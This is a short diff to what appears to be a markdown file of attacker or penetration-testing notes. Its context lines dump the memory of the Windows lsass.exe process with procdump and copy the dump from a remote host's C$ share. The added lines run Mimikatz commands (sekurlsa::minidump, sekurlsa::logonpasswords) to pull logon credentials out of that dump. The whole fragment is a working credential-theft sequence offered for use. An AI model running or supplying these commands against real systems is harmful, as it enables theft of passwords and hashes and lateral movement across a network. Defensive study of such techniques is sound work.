@@ -66,4 +66,6 @@ lsa_dump_sam
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 exit
 cp '\\jump09.ops.comply.com\c$\lsass.dmp' .
+sekurlsa::minidump "C:\Users\ofir\Desktop\lsass.dmp"
+sekurlsa::logonpasswords
 ```
